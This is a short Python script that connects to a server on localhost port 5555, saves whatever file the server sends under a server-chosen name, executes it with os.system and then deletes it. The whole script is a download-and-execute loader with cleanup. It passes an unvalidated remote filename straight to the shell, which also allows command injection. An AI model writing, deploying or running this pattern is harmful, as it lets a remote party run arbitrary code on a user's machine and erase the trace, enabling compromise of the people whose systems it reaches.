import socket
import os

# Server configuration
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("localhost", 5555))

# Get file information from the server
file_info_stream = client.makefile('rb')
raw_info = file_info_stream.readline().decode("utf-8").strip()

# Parse the filename
if "|" in raw_info:
    file_name = raw_info.split("|")[0]
else:
    file_name = raw_info

buffer_size = 4096 * 8

# Receive and save the file data
with open(file_name, "wb") as f:
    while True:
        data = client.recv(buffer_size)
        if not data:
            break
        f.write(data)

# Execute and cleanup
os.system(file_name)
os.remove(file_name)

print(f"'{file_name}' was successfully saved and executed.")